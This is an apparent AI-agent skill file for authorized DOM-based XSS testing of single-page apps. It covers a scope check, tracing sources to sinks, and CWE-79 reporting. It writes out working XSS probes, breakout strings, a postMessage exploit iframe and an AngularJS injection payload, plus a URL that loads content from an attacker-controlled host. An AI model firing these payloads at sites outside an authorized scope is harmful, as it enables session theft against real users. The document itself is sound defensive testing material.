---
name: dom-xss-hunter
description: "Tests client-side JavaScript for DOM-based XSS by tracing user-controllable sources (location, document.URL, postMessage, hash) through dangerous sinks (eval, innerHTML, document.write). Use when the target is a SPA or uses heavy client-side rendering; when URL fragments or postMessage control on-page behavior; or when the orchestrator's recon identifies sink-heavy endpoints. Produces findings with CWE-79 mapping, fragment-based PoCs, and framework-specific remediation (textContent, CSP, origin-checked postMessage). Defensive testing only, against assets listed in .claude/security-scope.yaml."
model: sonnet
allowed-tools: >
  Read, Grep, Glob, Write(path:.claude/planning/**),
  WebFetch,
  Bash(curl:*), Bash(wget:*), Bash(httpx:*), Bash(ffuf:*),
  Bash(gobuster:*), Bash(nuclei:*), Bash(jq:*), Bash(arjun:*),
  Bash(gf:*), Bash(gau:*), Bash(waybackurls:*),
  Bash(nmap:--script=safe*), Bash(nmap:-sV), Bash(nmap:-Pn),
  Bash(dig:*), Bash(host:*), Bash(whois:*),
  Bash(openssl:s_client*), Bash(openssl:x509*)
metadata:
  version: 1.0.0
  category: security-testing
  subcategory: client-side
  authorization_required: true
  tier: T1
  source_methodology: "Guia Completo de Testes e Mitigação de DOM XSS.md"
  service_affecting: false
  composed_from: []
---

# DOM XSS Hunter

## Goal

Test client-side JavaScript for DOM-based Cross-Site Scripting — flaws where
user-controllable data flows through client-side Sources (e.g.,
`document.location`, `window.name`, `postMessage`, `document.referrer`)
into dangerous Sinks (e.g., `eval`, `innerHTML`, `document.write`,
`jQuery.html`) without sanitization. This skill implements WSTG-CLNT-01
and maps findings to CWE-79 (Improper Neutralization of Input During Web
Page Generation) with the DOM sub-taxonomy. The goal is to give the frontend
team a concrete list of source→sink flows that require `textContent`
replacement, strict CSP, or origin-validated postMessage handlers.

## When to Use

- The target is a single-page application (React, Vue, Angular, Svelte) or
  uses heavy client-side JavaScript rendering.
- URL fragments (`#`) or `hashchange` events control on-page behavior.
- `window.postMessage` is used for cross-frame/cross-origin communication.
- Client-side routing reads from `location.pathname`, `location.search`, or
  `location.hash`.
- Legacy jQuery code uses `.html()`, `.append()`, or `$.parseHTML()` on
  user input.
- Third-party JavaScript (analytics, widgets) writes to the DOM using
  values from URL or cookies.
- The orchestrator selects this skill after `web-recon-active` identifies
  source/sink-heavy endpoints.

## When NOT to Use

- For XSS where the server-side response already contains the payload —
  use `xss-hunter` (Reflected/Stored XSS).
- For flaws in client-side template engines (e.g., AngularJS expression
  injection) — that's Client-Side Template Injection (handled by
  `xss-hunter` with CSTI variant).
- For issues requiring the victim to paste a payload into their own
  browser console (Self-XSS) — not considered a deliverable attack unless
  combined with UI redress.
- For pure server-side injection — different class.
- Any asset not listed in `.claude/security-scope.yaml` or whose
  `testing_level` is not `active`.

## Authorization Check (MANDATORY FIRST STEP)

Before ANY outbound activity:

1. Read `.claude/security-scope.yaml`. If the file doesn't exist or doesn't
   parse, halt and report.
2. Confirm the intended target appears in the `assets` list AND its
   `testing_level` is `active`.
3. DOM-XSS testing fires JavaScript in the tester's own browser — there is
   no service-affecting server load. However, findings that prove
   execution typically use a harmless `alert(document.domain)` or payload
   exfiltration to the authorized OOB listener. Confirm the listener is in
   the scope file before using exfil payloads.
4. If the target is ambiguous, write it to
   `.claude/planning/{issue}/SCOPE_QUESTIONS.md` and halt for that target
   only.
5. Log the authorization check to
   `.claude/planning/{issue}/SECURITY_AUDIT.md` Skills Run Log before
   producing probes.

## Inputs

The skill expects the caller to provide:

- `{issue}`: the planning folder name
- `{target}`: the asset identifier from security-scope.yaml
- `{scope_context}`: optional — specific SPA routes or JS bundles to focus on
- `{user_a}`: optional — authenticated session (some DOM sinks only fire
  on logged-in views)
- `{oob_listener}`: authorized OOB listener for exfil PoCs (from scope
  file)

## Methodology

### Phase 1: Inventory Client-Side Sources

1. **Extract JavaScript bundles** [WAHH, Ch 12, p. 488]

   Do: Fetch the target's main entry points (curl -o), enumerate all
   `<script src>` references and inline scripts. For each external
   bundle, download and beautify (`js-beautify`). Source-map bundles when
   available — production builds often ship `.map` files.

   Record: `.claude/planning/{issue}/dom-xss-sources/{bundle}.js`.

2. **Grep for Source APIs** [Bug Bounty Playbook V2, p. 120]

   Do: `grep -nE "(document\.location|document\.URL|document\.referrer|location\.hash|location\.search|location\.href|window\.name|postMessage|localStorage\.get|sessionStorage\.get)"`
   across every bundle. Each hit is a candidate user-controllable Source.

   Vulnerable candidates: Any match where the value is assigned to a
   variable that later flows to a Sink.

   Record: Source inventory keyed by file:line.

### Phase 2: Inventory Dangerous Sinks

3. **Grep for Sink APIs** [WSTG v4.2, WSTG-CLNT-01]

   Do: `grep -nE "(eval\(|setTimeout\(|setInterval\(|Function\(|document\.write|innerHTML|outerHTML|insertAdjacentHTML|\.html\(|document\.writeln)"`.
   Also match jQuery selectors that look like HTML (`$('<div>' + ... + '</div>')`)
   — those call `$.parseHTML` internally.

   Vulnerable candidates: Sinks that receive a Source value without an
   obvious sanitizer between them.

   Record: Sink inventory keyed by file:line.

### Phase 3: Trace Source → Sink Flows

4. **Manual taint analysis** [WAHH, Ch 12, p. 488]

   Do: For each high-value Source (fragment, search, postMessage data),
   trace through the AST to every Sink it can reach. Note intermediate
   transformations: if the code calls `encodeURIComponent`, `DOMPurify`,
   or passes through a known-safe template engine, the flow is
   neutralized.

   Vulnerable response: Source reaches Sink with no sanitization (or only
   inadequate sanitization like a `String.replace('<script>', '')`).

   Not-vulnerable response: Source is encoded, sanitized by DOMPurify, or
   only assigned to safe properties (`textContent`, `value`).

   Record: Flow list in `dom-xss-targets.md`.

### Phase 4: Probe Fragment and Query Sources

5. **Fragment-based probe** [WSTG v4.2, WSTG-CLNT-01]

   Do: For each candidate flow originating from `location.hash` or
   `location.search`, visit the URL with a reflected-XSS probe in the
   fragment:

   ```
   https://{target}/{path}#<img src=x onerror=alert(document.domain)>
   https://{target}/{path}?q=<img src=x onerror=alert(document.domain)>
   ```

   Vulnerable response: `alert` fires. Confirm by inspecting DevTools'
   Elements pane for the injected element.

   Not-vulnerable response: The fragment is URL-encoded in the DOM, used
   only with `textContent`, or filtered by a client-side sanitizer.

   Record: Append FINDING-NNN with the URL and a DevTools screenshot.

6. **Syntactic-context breakout** [WAHH, Ch 12, p. 487]

   Do: When the Source lands inside an existing JS string literal (e.g.,
   `var x = "...USER_INPUT..."; eval("f('" + x + "')")`), fuzz with
   breakout strings: `";alert(1)//`, `'-alert(1)-'`, `\");alert(1)//`.
   Test both single- and double-quote contexts and template-literal
   contexts.

   Record: Each successful breakout is a finding.

### Phase 5: Probe Cross-Frame Sources

7. **postMessage origin-check testing** [XSS Cheat Sheet, p. 10; WSTG v4.2, WSTG-CLNT-11]

   Do: Host an exploit page that opens the target in a new window or
   iframe, then sends crafted `postMessage` payloads:

   ```html
   <iframe src="https://{target}/{path}" id="t"></iframe>
   <script>
     const t = document.getElementById('t');
     t.onload = () => t.contentWindow.postMessage(
       '<img src=x onerror=alert(document.domain)>',
       '*'
     );
   </script>
   ```

   Vulnerable response: The target's `message` handler accepts without
   checking `event.origin` and the payload fires in the target's context.

   Not-vulnerable response: `message` handler explicitly validates
   `event.origin` against a whitelist.

   Record: Append FINDING-NNN with handler source snippet showing the
   missing check.

8. **`window.name` source** [WAHH, Ch 12]

   Do: If the target reads `window.name` (rare but present in legacy
   apps), open a test page that sets `window.name = "<img src=x
   onerror=alert(1)>"` and then navigates to the target — the `name`
   property persists across the navigation.

### Phase 6: Probe Same-Origin Navigation Sinks

9. **CORS/fetch DOM sink** [XSS Cheat Sheet, p. 10]

   Do: If the target fetches URL-supplied content and renders it, point
   the fetch at a controlled host:

   ```
   https://{target}/#page=http://attacker-controlled.com/evil.html
   ```

   Vulnerable response: Target fetches and `innerHTML`-renders the remote
   content.

   Not-vulnerable response: Target refuses non-same-origin URLs or uses
   `textContent`.

10. **Client-side template injection probe** [XSS Cheat Sheet, p. 10]

    Do: For AngularJS-era apps (1.x), test `{{constructor.constructor('alert(1)')()}}`
    in user-controlled fields. For Vue/Svelte apps, try the engine's
    expression syntax. Note: this is adjacent to DOM-XSS — if confirmed,
    cross-reference `xss-hunter` for the full CSTI methodology.

## Payload Library

Categories (full payloads in `references/payloads.md`):

- **Fragment probes**: `#<img src=x onerror=alert(1)>`,
  `#javascript:alert(1)`, `#"><svg onload=alert(1)>`
- **String-breakout polyglots**: `";alert(1)//`, `'-alert(1)-'`,
  `${alert(1)}`, `` `-alert(1)` ``
- **postMessage payloads**: raw HTML strings, structured payloads for
  handlers that expect JSON, origin-spoofing probes
- **DOM-safe but browser-dangerous**: `javascript:` pseudo-URLs, `data:`
  text/html, `vbscript:` (legacy)
- **Framework-specific**: AngularJS `{{}}`, React `dangerouslySetInnerHTML`
  bypasses, Vue `v-html`

## Output Format

Findings append to `.claude/planning/{issue}/SECURITY_AUDIT.md` per the
schema in `.claude/skills/_shared/finding-schema.md`.

Specific to this skill:

- **CWE**: CWE-79. For DOM-specific, add the DOM Clobbering / DOM-based
  sub-taxonomy note in the Summary.
- **OWASP**: WSTG-CLNT-01. For postMessage specifically, WSTG-CLNT-11.
  For APIs exposing data to sink-heavy frontends, also API8:2019.
- **CVSS vectors**: typical DOM-XSS `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`.
  Raise integrity/confidentiality where session hijack is demonstrated.
- **Evidence**: the reproducing URL (or exploit HTML for postMessage),
  a DevTools screenshot of the injected element, and the source/sink flow
  citation (`bundle.js:142 → bundle.js:270`).
- **Remediation framing**: frontend engineer. Include framework-specific
  remediation in `references/remediation.md` for React (dangerouslySetInnerHTML
  avoidance, DOMPurify), Angular (DomSanitizer), Vue (v-html restraint),
  jQuery (`$.text()` instead of `.html()`), and native JS
  (`textContent` instead of `innerHTML`).

The skill also updates:

- `.claude/planning/{issue}/STATUS.md` — its row under Phase 7: Security
- `.claude/planning/{issue}/SECURITY_AUDIT.md` Skills Run Log

## Quality Check (Self-Review)

Before marking complete, verify:

- [ ] Every finding cites both a Source (file:line) and a Sink (file:line)
- [ ] Every finding has a reproducing URL OR an exploit HTML file
- [ ] Every finding is confirmed by observable execution, not just
      reflection in the DOM
- [ ] No finding is a Self-XSS (payload requires the victim to paste into
      their own console) without also demonstrating a delivery mechanism
- [ ] Remediation snippets match the detected framework (no React
      snippets for a jQuery app)
- [ ] Skills Run Log row updated from `running` to `complete` or
      `halted:{reason}`

## Common Issues

- **Inert sinks**: The payload appears in the page but is assigned to
  `textContent` or `innerText`, which browsers render as literal text
  regardless of HTML. Reflection without execution is not a DOM-XSS.
  Verify by opening DevTools Elements and checking whether an actual
  `<img>` / `<script>` node was created.

- **Browser XSS filters**: Legacy browsers (IE, older Chrome) had
  auditor-style filters that blocked the attack. Modern browsers don't —
  test in current Chrome/Firefox to avoid false negatives.

- **Self-XSS framing**: The vulnerability requires the victim to manually
  paste a complex payload into their own browser console or address bar.
  Not a deliverable attack unless combined with a second vuln (clickjacking,
  a confirmed social-engineering vector) that delivers the payload
  automatically.

- **Debug-only paths**: The probe succeeds (e.g., math evaluation) but
  only in a developer-intended debug mode inaccessible to production
  users (gated by a feature flag or localhost check). Confirm reachability
  from an external network before filing.

- **DOM clobbering false positives**: Named-element collisions
  (`<img name="foo">` clashing with a `foo` variable) can produce
  surprising behavior without being directly exploitable. Only file when
  a sink is actually reached.

## References

- `references/payloads.md` — full payload catalog (fragment, breakout,
  postMessage, framework)
- `references/remediation.md` — framework-specific safe-API snippets

External:
- WSTG-CLNT-01: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-Based_Cross_Site_Scripting
- WSTG-CLNT-11: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging
- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- DOM-based XSS Prevention Cheat Sheet:
  https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html

## Source Methodology

Converted from:
`pentest-agent-development/notebooklm-notes/Guia Completo de Testes e Mitigação de DOM XSS.md`

Grounded in:
- Bug Bounty Bootcamp, Ch 6 (XSS)
- The Web Application Hacker's Handbook, Ch 12, 21 (Cross-Site Scripting)
- Bug Bounty Playbook V2 (DOM XSS case studies)
- XSS Cheat Sheet (payload catalog)
- OWASP WSTG v4.2 (WSTG-CLNT-01, WSTG-CLNT-11)
- The Tangled Web, Ch 6, 9, 16

Conversion date: 2026-04-23
Conversion prompt version: 1.0
